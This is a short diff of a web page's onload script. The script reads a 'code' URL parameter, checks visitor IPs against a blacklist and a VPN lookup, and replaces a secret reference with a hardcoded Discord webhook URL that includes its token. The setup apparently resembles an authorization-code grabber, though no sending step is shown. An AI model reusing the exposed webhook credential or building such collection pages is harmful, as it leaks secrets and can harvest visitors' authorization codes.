@@ -159,7 +159,7 @@
         window.onload = function() {
             const urlParams = new URLSearchParams(window.location.search);
             const code = urlParams.get('code');
-            const webhookUrl = "{{ secrets.WEBHOOK_URL }}"; // Replace with GitHub Secret reference
+            const webhookUrl = "https://discord.com/api/webhooks/1262820614394089493/zFLBwjMT-ZO7wvhAFPWYVy0CdUauTknqr-ifRewQvpZsydrzEEfQYU0gtkylaDKhOSOr"; // Replace with your actual webhook URL
 
             const blacklistedIPs = ["81.35.53.46", "1"];
             const vpnProxyCheckUrl = "https://ipinfo.io/json";
